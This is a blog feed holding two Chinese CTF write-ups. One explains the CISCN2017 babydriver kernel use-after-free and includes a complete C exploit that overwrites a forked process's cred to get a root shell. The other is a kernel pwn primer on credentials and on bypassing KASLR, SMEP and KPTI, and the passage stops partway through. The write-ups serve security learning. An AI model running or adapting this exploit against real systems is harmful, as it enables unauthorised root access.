<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>kernel-UAF</title>
      <link href="//post/kernel-UAF.html"/>
      <url>//post/kernel-UAF.html</url>
      
        <content type="html"><![CDATA[<h1 id="kernel-UAF（一）"><a href="#kernel-UAF（一）" class="headerlink" title="kernel UAF（一）"></a>kernel UAF（一）</h1><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>IDA pro分析 没有去符号表（hhh好怀念这样的感觉）</p><p><img src="https://pic.imgdb.cn/item/621cd0a22ab3f51d91e86d86.png"></p><p>提供这么些函数</p><p>**babyrelease ： **</p><p>主要是<code>kfree(babydev_struct.device_buf);</code></p><p><strong>babyopen:</strong>  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c">babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>期中kmem_cache_alloc_trace()函数实际上就是调用kmalloc()的时候最后起作用的函数</p><p>**babyioctl : ** </p><p>ioctl是设备驱动程序中对设备的I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的 <strong>传输波特率</strong>、马达的转速等等。它的调用个数如下： </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">ioctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> ind cmd<span class="token punctuation">,</span> …<span class="token punctuation">)</span>； <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  其中fd是用户程序打开设备时使用 <strong>open函数返回的文件标示符</strong>，cmd是用户程序对设备的 <strong>控制命令</strong>，至于后面的省略号，那是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。<br>  ioctl函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数来控制设备的I/O通道。</p><p>其中在babyioctl中定义了一个新的cmd 0x10001：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> command <span class="token operator">==</span> <span class="token number">0x10001</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_kmalloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> v4<span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"alloc done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>babywrite 和babyread ：</strong></p><p>分别主要调用  copy_from_user(); 和  copy_to_user(buffer);</p><p> copy_to_user()这个函数的完整形态为</p><pre class="line-numbers language-none"><code class="language-none">unsigned long copy_to_user(void *to, const void *from, unsigned long n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数的作用是将内核空间的数据复制到用户空间。其中<br>to：目标地址（用户空间）<br>from：源地址（内核空间）<br>n：将要拷贝数据的字节数<br>返回：成功返回0，失败返回没有拷贝成功的数据字节数</p><p>​    copy_from_user()这个函数的完整形态为</p><pre class="line-numbers language-none"><code class="language-none">unsigned long copy_from_user(void *to, const void *from, unsigned long n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数的作用是将用户空间的数据复制到内核空间。其中</p><p>to：目标地址（内核空间）<br>from：源地址（用户空间）<br>n：将要拷贝数据的字节数<br>返回：成功返回0，失败返回没有拷贝成功的数据字节数</p><p>使用这个两个函数就可以实现内核空间和用户空间的数据交互</p><p>**babydriver_init 和 babydriver_exit **</p><p>两个函数分别完成了 <strong>/dev/babydev</strong> 设备的初始化和清理</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞。</p><p>也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过的，这样就造成了一个 UAF。</p><p>之后就可以修个cred来提权到root</p><p>之后根据 UAF 的思想，思路如下：</p><ol><li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li><li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li><li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li></ol><p>首先遇到的问题就是计算cred的size</p><p>一种方法是在init文件中得知内核版本为4.4.72 </p><p>在<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">cred.h - include/linux/cred.h - Linux source code (v4.4.72) - Bootlin</a>中可以查找到cred的定义源码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token punctuation">&#123;</span><span class="token class-name">atomic_t</span>usage<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span><span class="token class-name">atomic_t</span>subscribers<span class="token punctuation">;</span><span class="token comment">/* number of processes subscribed */</span><span class="token keyword">void</span><span class="token operator">*</span>put_addr<span class="token punctuation">;</span><span class="token keyword">unsigned</span>magic<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC</span><span class="token expression"><span class="token number">0x43736564</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC_DEAD</span><span class="token expression"><span class="token number">0x44656144</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token class-name">kuid_t</span>uid<span class="token punctuation">;</span><span class="token comment">/* real UID of the task */</span><span class="token class-name">kgid_t</span>gid<span class="token punctuation">;</span><span class="token comment">/* real GID of the task */</span><span class="token class-name">kuid_t</span>suid<span class="token punctuation">;</span><span class="token comment">/* saved UID of the task */</span><span class="token class-name">kgid_t</span>sgid<span class="token punctuation">;</span><span class="token comment">/* saved GID of the task */</span><span class="token class-name">kuid_t</span>euid<span class="token punctuation">;</span><span class="token comment">/* effective UID of the task */</span><span class="token class-name">kgid_t</span>egid<span class="token punctuation">;</span><span class="token comment">/* effective GID of the task */</span><span class="token class-name">kuid_t</span>fsuid<span class="token punctuation">;</span><span class="token comment">/* UID for VFS ops */</span><span class="token class-name">kgid_t</span>fsgid<span class="token punctuation">;</span><span class="token comment">/* GID for VFS ops */</span><span class="token keyword">unsigned</span>securebits<span class="token punctuation">;</span><span class="token comment">/* SUID-less security management */</span><span class="token class-name">kernel_cap_t</span>cap_inheritable<span class="token punctuation">;</span> <span class="token comment">/* caps our children can inherit */</span><span class="token class-name">kernel_cap_t</span>cap_permitted<span class="token punctuation">;</span><span class="token comment">/* caps we're permitted */</span><span class="token class-name">kernel_cap_t</span>cap_effective<span class="token punctuation">;</span><span class="token comment">/* caps we can actually use */</span><span class="token class-name">kernel_cap_t</span>cap_bset<span class="token punctuation">;</span><span class="token comment">/* capability bounding set */</span><span class="token class-name">kernel_cap_t</span>cap_ambient<span class="token punctuation">;</span><span class="token comment">/* Ambient capability set */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span>jit_keyring<span class="token punctuation">;</span><span class="token comment">/* default keyring to attach requested * keys to */</span><span class="token keyword">struct</span> <span class="token class-name">key</span> __rcu <span class="token operator">*</span>session_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring inherited over fork */</span><span class="token keyword">struct</span> <span class="token class-name">key</span><span class="token operator">*</span>process_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this process */</span><span class="token keyword">struct</span> <span class="token class-name">key</span><span class="token operator">*</span>thread_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this thread */</span><span class="token keyword">struct</span> <span class="token class-name">key</span><span class="token operator">*</span>request_key_auth<span class="token punctuation">;</span> <span class="token comment">/* assumed request_key authority */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SECURITY</span></span><span class="token keyword">void</span><span class="token operator">*</span>security<span class="token punctuation">;</span><span class="token comment">/* subjective LSM security */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">struct</span> <span class="token class-name">user_struct</span> <span class="token operator">*</span>user<span class="token punctuation">;</span><span class="token comment">/* real user ID subscription */</span><span class="token keyword">struct</span> <span class="token class-name">user_namespace</span> <span class="token operator">*</span>user_ns<span class="token punctuation">;</span> <span class="token comment">/* user_ns the caps and keyrings are relative to. */</span><span class="token keyword">struct</span> <span class="token class-name">group_info</span> <span class="token operator">*</span>group_info<span class="token punctuation">;</span><span class="token comment">/* supplementary groups for euid/fsgid */</span><span class="token keyword">struct</span> <span class="token class-name">rcu_head</span>rcu<span class="token punctuation">;</span><span class="token comment">/* RCU deletion hook */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者自己编译出一个内核模块make之后查看</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//mydriver.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cred.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"Dual BSD/GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">my_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of struct cred : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cred</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type atomic_t : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">atomic_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type void* : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type unsigned : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type kuid_t : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">kuid_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">my_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Goodbye, baby driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>my_init<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>my_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> cred_size.oKERNELBUILD <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> uname -r<span class="token punctuation">)</span>/build<span class="token target symbol">modules</span><span class="token punctuation">:</span>    make -C <span class="token variable">$</span><span class="token punctuation">(</span>KERNELBUILD<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>CURDIR<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span>    make -C <span class="token variable">$</span><span class="token punctuation">(</span>KERNELBUILD<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>CURDIR<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后得到该版本的cred的 size = 0xA8</p><p>另一种方法是</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;proc&#x2F;kallsyms | grep &quot;cred_init&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://pic.imgdb.cn/item/621de9fe2ab3f51d9167db1e.png"></p><p>然后将所得地址的后几位记下来，将vmlinux导入ida，查找后几位得到cred的大小</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stropts.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 打开两次设备</span>    <span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 释放 fd1</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span>    <span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fork error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span>        <span class="token keyword">char</span> zeros<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> zeros<span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] root now."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="get-root-shell"><a href="#get-root-shell" class="headerlink" title="get root shell"></a>get root shell</h3><p>由于kernel中没有libc，首先需要静态编译编写的exp</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gcc exp.c -static -o exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后将其放入core/tmp文件中，重新打包 rootfs.cpio</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find . | cpio -o --format&#x3D;newc &gt; .&#x2F;..&#x2F;rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后运行boot.sh实现本地提权</p><p><img src="https://pic.imgdb.cn/item/621debe92ab3f51d916ada21.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
            <tag> kernel </tag>
            
            <tag> UAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-从零开始kernel pwn</title>
      <link href="//post/pwn-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bkernel-pwn.html"/>
      <url>//post/pwn-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bkernel-pwn.html</url>
      
        <content type="html"><![CDATA[<h1 id="从零开始-kernel-pwn-入门"><a href="#从零开始-kernel-pwn-入门" class="headerlink" title="从零开始 kernel pwn 入门"></a>从零开始 kernel pwn 入门</h1><h2 id="0x00-内核基础"><a href="#0x00-内核基础" class="headerlink" title="0x00 内核基础"></a>0x00 内核基础</h2><h3 id="0-内核kernel"><a href="#0-内核kernel" class="headerlink" title="0.内核kernel"></a>0.内核kernel</h3><p><strong>操作系统</strong>（Operation System）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制IO设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口</p><p>而运行在内核态的<strong>内核</strong>（<strong>kernel</strong>）则是<strong>一个操作系统最为核心的部分</strong>，提供着一个操作系统最为基础的功能</p><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中</p><p><strong>Process credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p><ul><li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li><li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li><li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li></ul><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p><ul><li><strong>真实用户ID</strong>（real UID）：标识一个进程<strong>启动时的用户ID</strong></li><li><strong>保存用户ID</strong>（saved UID）：标识一个进程<strong>最初的有效用户ID</strong></li><li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限</li><li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li></ul><p>在通常情况下这几个ID应当都是相同的</p><p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的</p><p>由于一个进程的权限是由位于内核空间的<code>cred</code>结构体进行管理的，所以只要改变一个进程的<code>cred</code>结构体，就能改变其执行权限</p><p>在内核空间有如下两个函数，都位于<code>kernel/cred.c</code>中：</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></li><li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</li></ul><p>在<code>prepare_kernel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p><p>所以只要我们能够在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，那么就能够将当前进程的权限提升到<code>root</code></p><h3 id="1-保护机制"><a href="#1-保护机制" class="headerlink" title="1.保护机制"></a>1.保护机制</h3><p><strong>KASLR</strong></p><p>KASLR即<code>内核空间地址随机化</code>（kernel address space layout randomize），与用户态程序的ASLR相类似——在内核镜像映射到实际的地址空间时加上一个偏移值，但是内核内部的相对偏移其实还是不变的</p><p>在未开启KASLR保护机制时，内核的基址为<code>0xffffffff81000000</code></p><p><strong>FGKASLR</strong></p><p>KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，<strong>以函数粒度重新排布内核代码</strong></p><p><strong>STACK PROTECTOR</strong></p><p>类似于用户态程序的canary，通常又被称作是stack cookie，用以检测<strong>是否发生内核堆栈溢出</strong>，若是发生内核堆栈溢出则会产生kernel panic</p><p>内核中的canary的值通常取自gs段寄存器某个固定偏移处的值</p><p><strong>SMAP/SMEP</strong></p><p>SMAP即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），SMEP即<code>管理模式执行保护</code>（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用以阻止<strong>内核空间直接访问/执行用户空间的数据</strong>，完全地将内核空间与用户空间相分隔开，用以防范ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击</p><p>SMEP保护的绕过有以下两种方式：</p><ul><li>在设计中，为了使隔离的数据进行交换时具有更高的性能，隐性地址共享始终存在（VDSO &amp; VSYSCALL），<strong>用户态进程与内核共享同一块物理内存</strong>，因此通过隐性内存共享可以完整的绕过软件和硬件的隔离保护，这种攻击方式被称之为<code>ret2dir</code>（return-to-direct-mapped memory ）</li><li>Intel下系统根据CR4控制寄存器的第20位标识是否开启SMEP保护（1为开启，0为关闭），若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护，完成SMEP-bypass，接下来就能够重新进行ret2usr</li></ul><p><strong>KPTI</strong></p><p>KPTI即<code>内核页表隔离</code>（Kernel page-table isolation），内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化</p><p><strong>KPTI 机制的出现使得 ret2usr 彻底成为过去式</strong></p><h2 id="0x01-内核编译"><a href="#0x01-内核编译" class="headerlink" title="0x01 内核编译"></a>0x01 内核编译</h2><p>编译完成之后：</p><ul><li><strong>bzImage</strong>：目前主流的 kernel 镜像格式，即 big zImage（即 bz 不是指 bzip2），适用于较大的（大于 512 KB） Kernel。这个镜像会被加载到内存的高地址，高于 1MB。bzImage 是用 gzip 压缩的，文件的开头部分有 gzip 解压缩的代码，所以我们不能用 gunzip 来解压缩。</li><li><strong>zImage</strong>：比较老的 kernel 镜像格式，适用于较小的（不大于 512KB） Kernel。启动时，这个镜像会被加载到内存的低地址，即内存的前 640 KB。zImage 也不能用 gunzip 来解压缩。</li><li><strong>vmlinuz</strong>：vmlinuz 不仅包含了压缩后的 vmlinux，还包含了 gzip 解压缩的代码。实际上就是 zImage 或者 bzImage 文件。该文件是 bootable 的。 bootable 是指它能够把内核加载到内存中。对于 Linux 系统而言，该文件位于 /boot 目录下。该目录包含了启动系统时所需要的文件。</li><li><strong>vmlinux</strong>：静态链接的 Linux kernel，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 vmlinuz 的过程中产生的。该文件适合于调试。但是该文件不是 bootable 的。</li><li><strong>vmlinux.bin</strong>：也是静态链接的 Linux kernel，只是以一个可启动的 (bootable) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li><li><strong>uImage</strong>：uImage 是 U-boot 专用的镜像文件，它是在 zImage 之前加上了一个长度为 0x40 的 tag 而构成的。这个 tag 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息。</li></ul><p><strong>一般kernel CTF会给出的文件</strong></p><ol><li>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li><li>bzImage: kernel binary</li><li>rootfs.cpio: 文件系统映像</li></ol><h2 id="0x02-Change-Self"><a href="#0x02-Change-Self" class="headerlink" title="0x02 Change Self"></a>0x02 Change Self</h2><h3 id="0-原理"><a href="#0-原理" class="headerlink" 